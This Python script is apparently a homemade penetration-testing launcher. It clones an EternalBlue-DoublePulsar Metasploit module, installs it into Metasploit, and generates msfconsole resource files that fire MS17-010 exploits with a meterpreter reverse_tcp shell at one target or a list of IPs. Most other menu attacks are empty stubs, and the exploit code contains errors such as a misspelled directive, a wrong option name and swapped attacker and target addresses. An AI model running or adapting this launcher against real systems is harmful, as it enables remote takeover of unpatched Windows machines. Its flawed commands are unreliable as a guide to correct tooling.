import subprocess
import shutil
import os
import platform
from tqdm import tqdm
import time



def update_install():
    repo_dir = "Eternalblue-Doublepulsar-Metasploit"
    
    # Step 1: Check if the repo already exists and update it, otherwise clone it
    if os.path.exists(repo_dir):
        print(f"Updating existing repository: {repo_dir}")
        # Use tqdm to display progress bar for the git pull
        with tqdm(total=100, desc="Updating Git Repository", ncols=100) as pbar:
            subprocess.run(["git", "-C", repo_dir, "pull"], check=True)
            for _ in range(100):
                time.sleep(0.01)  # Simulating a progress bar step
                pbar.update(1)
    else:
        print("Cloning repository...")
        with tqdm(total=100, desc="Cloning Git Repository", ncols=100) as pbar:
            clone_command = ["git", "clone", "https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit.git"]
            subprocess.run(clone_command, check=True)
            for _ in range(100):
                time.sleep(0.01)  # Simulating progress bar update
                pbar.update(1)
    
    # Step 2: Copy the 'eternalblue_doublepulsar.rb' file to the metasploit modules directory
    source_file = f"{repo_dir}/eternalblue_doublepulsar.rb"
    destination_dir = "/usr/share/metasploit-framework/modules/exploits/windows/smb/"
    
    if os.path.exists(source_file):
        print(f"Copying {source_file} to {destination_dir}...")
        # Using tqdm to show progress while copying the file
        with tqdm(total=100, desc="Copying File", ncols=100) as pbar:
            shutil.copy(source_file, destination_dir)
    else:
        print(f"Error: {source_file} does not exist.")
    
    clear_screen()




def clear_screen():
    system_platform = platform.system()
    #  Windows
    if system_platform == 'Windows':
        os.system('cls')
    # Linux / Mac
    else:
        os.system('clear')
        


def print_logo():
    print("\n\n\033[1;33m")  # צבע צהוב מודגש
    print("-" * 75)
    print(" █████╗ ███╗   ███╗██████╗  █████╗ ███████╗███████╗██████╗  ██████╗ ██████╗ ")
    print("██╔══██╗████╗ ████║██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗")
    print("███████║██╔████╔██║██████╔╝███████║███████╗███████╗██║  ██║██║   ██║██████╔╝")
    print("██╔══██║██║╚██╔╝██║██╔══██╗██╔══██║╚════██║╚════██║██║  ██║██║   ██║██╔══██╗")
    print("██║  ██║██║ ╚═╝ ██║██████╔╝██║  ██║███████║███████║██████╔╝╚██████╔╝██║  ██║")
    print("╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝")
    print("-" * 75)
    print("\t\t Hybrid Penetration Testing Tool")
    print("\033[38;5;245m")  # צבע אפור
    print("\t\t [Created by Shay Giladi]")
    print("\033[0m")
    print("\t\t Contact: shaygiladi97@gmail.com\n")

def main_menu():
    print_logo()
    print("Choose one of the following Options:\n")
    print(" [1] Infrastructure Attacks\n")
    print(" [2] Android Attacks\n")
    print(" [3] Knowledge Base\n")
    print(" [4] Web Application Attacks\n")
    print(" [5] Cloud Attacks\n")
    main_choice = input("Enter your choice --> ")
    
    if main_choice == "1":
        infrastructure_attacks()
    elif main_choice == "2":
        print("Option 2 selected.")
    elif main_choice == "3":
        print("Option 3 selected.")
    elif main_choice == "4":
        print("Option 4 selected.")
    else:
        print("Invalid choice.")

def infrastructure_attacks():
    print_logo()
    print("Choose one of the following attacks:\n")
    print(" [1] Eternal Blue (MS17-010)\n")
    print(" [2] Crack Map Exec (Get all passwords)\n")
    print(" [3] PsExec (Connect to host Password)\n")
    print(" [4] pth-winexe (Connect to host with Hash or Password)\n")
    print(" [5] MITM (Man In The Middle)\n")
    print(" [6] Wi-Fi (Get Handshake)\n")
    print(" [7] HTTP Server (Python)\n")
    print(" [8] Mail Spoofing (SMTP)\n")
    print(" [9] Advanced NMAP Scanning\n")
    print(" [10] Create Listener\n")
    print(" [11] NetDiscover (ARP Scan)\n")
    print(" [12] Hash Cracking\n")
    print(" [13] Password Attacks (Brute Force)\n")
    print(" [14] RPC Client And SMB Client Scan\n")
    print(" [15] Sam And System Cracking\n")
    attack_choice = input("Enter your choice --> ")
    
    if attack_choice == "1":
        eternal_blue()
    elif attack_choice == "2":
        print("Running Crack Map Exec...")
    else:
        print("Invalid choice.")









def eternal_blue():
    clear_screen()
    print("‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾")
    print("           -+= Eternal Blue ( MS17-010 ) =+-      ")
    print("__________________________________________________")
    print("Choose one of the following options\n")
    print(" [1] For One Target\n")
    print(" [2] For List of Targets ( MS17-010-iplist.txt )\n")
    eternal_choice = input("Enter your choice: ")
    
    if eternal_choice == "1":
        clear_screen()
        IP_Address = input("\nEnter your IP Address: ")
        Target_IP_Address = input("\nEnter Target IP Address: ")
		
        print("\nChoose one of the following options\n")
        print(" [1] x64 (64bit)\n")
        print(" [2] x86 (32bit)\n")
        print(" [3] Eternal Blue Standard\n")
        eternal_os_choice = input("Enter your choice: ")
        
        if eternal_os_choice == "1":
            commands = f"""
                use exploit/windows/smb/eternalblue_doublepulsar
                set payload windows/meterpreter/reverse_tcp
                set processinject explorer.exe
                set RHOSTS {IP_Address}
                set RPORT 445
                set LHOSTS {Target_IP_Address}
                set LPORT 4444
                seet TARGETARCHITECTURE x64
                exploit
            """
            
            with open('commands.txt', 'w') as file:
                file.write(commands)
            
            terminal_command = ['exo-open', '--launch', 'TerminalEmulator', 'msfconsole', '-r', 'commands.txt']
            subprocess.Popen(terminal_command)
            
        elif eternal_os_choice == "2":
            commands = f"""
                use exploit/windows/smb/eternalblue_doublepulsar
                set payload windows/meterpreter/reverse_tcp
                set processinject explorer.exe
                set RHOSTS {Target_IP_Address}
                set RPORT 445
                set LHOSTS {IP_Address}
                set LPORT 4444
                seet TARGETARCHITECTURE x86
                exploit
            """
            
            with open('commands.txt', 'w') as file:
                file.write(commands)
            
            terminal_command = ['exo-open', '--launch', 'TerminalEmulator', 'msfconsole', '-r', 'commands.txt']
            subprocess.Popen(terminal_command)
            
        elif eternal_os_choice == "3":
            commands = f"""
                use exploit/windows/smb/ms17_010_eternalblue
                set RHOSTS {Target_IP_Address}
                set RPORT 445
                set LHOSTS {IP_Address}
                set LPORT 4444
                exploit
            """
            
            with open('commands.txt', 'w') as file:
                file.write(commands)
            
            terminal_command = ['exo-open', '--launch', 'TerminalEmulator', 'msfconsole', '-r', 'commands.txt']
            subprocess.Popen(terminal_command)
            
        else:
            print("Invalid choice.")
        
    elif eternal_choice == "2":
        clear_screen()
        
        IP_Address = input("\nEnter your IP Address: ")
        with open("MS17-010-iplist.txt", "w") as f:
            while True:
                ip = input("Enter an IP address (or type 'stop' to finish): ")
                
                # If the user types 'stop', exit the loop
                if ip.lower() == 'stop':
                    break
                
                # Otherwise, write the IP to the file
                f.write(f"{ip}\n")

        commands = f"""
            use exploit/windows/smb/ms17_010_eternalblue
            set RHOSTS file:MS17-010-iplist.txt
            set RPORT 445
            set LHOST {IP_Address}
            set LPORT 4444
            exploit
        """
        
        with open('commands.txt', 'w') as file:
            file.write(commands)
        
        terminal_command = ['exo-open', '--launch', 'TerminalEmulator', 'msfconsole', '-r', 'commands.txt']
        subprocess.Popen(terminal_command)

    else:
        print("Invalid choice.")




if __name__ == "__main__":
    update_install()
    main_menu()
